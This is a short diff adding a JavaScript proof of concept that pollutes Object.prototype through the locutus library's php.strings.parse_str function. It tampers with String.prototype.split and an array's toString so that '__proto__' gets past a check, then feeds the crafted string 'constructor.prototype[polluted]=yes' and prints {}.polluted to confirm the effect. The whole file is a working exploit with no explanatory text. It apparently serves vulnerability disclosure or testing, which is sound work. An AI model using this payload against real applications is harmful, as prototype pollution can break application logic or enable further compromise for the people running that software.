@@ -1,0 +1,20 @@
+var arg = ['__proto__'];
+var flag1 = true;
+arg.toString = function () {
+    if (flag1) {
+        flag1 = false;
+        return 'foo';
+    } else {
+        return '__proto__';
+    }
+};
+String.prototype.split = function () {
+    return [
+        arg,
+        'polluted'
+    ];
+};
+console.log({}.polluted);
+const locutus = require('locutus');
+locutus.php.strings.parse_str('constructor.prototype[polluted]=yes');
+console.log({}.polluted);
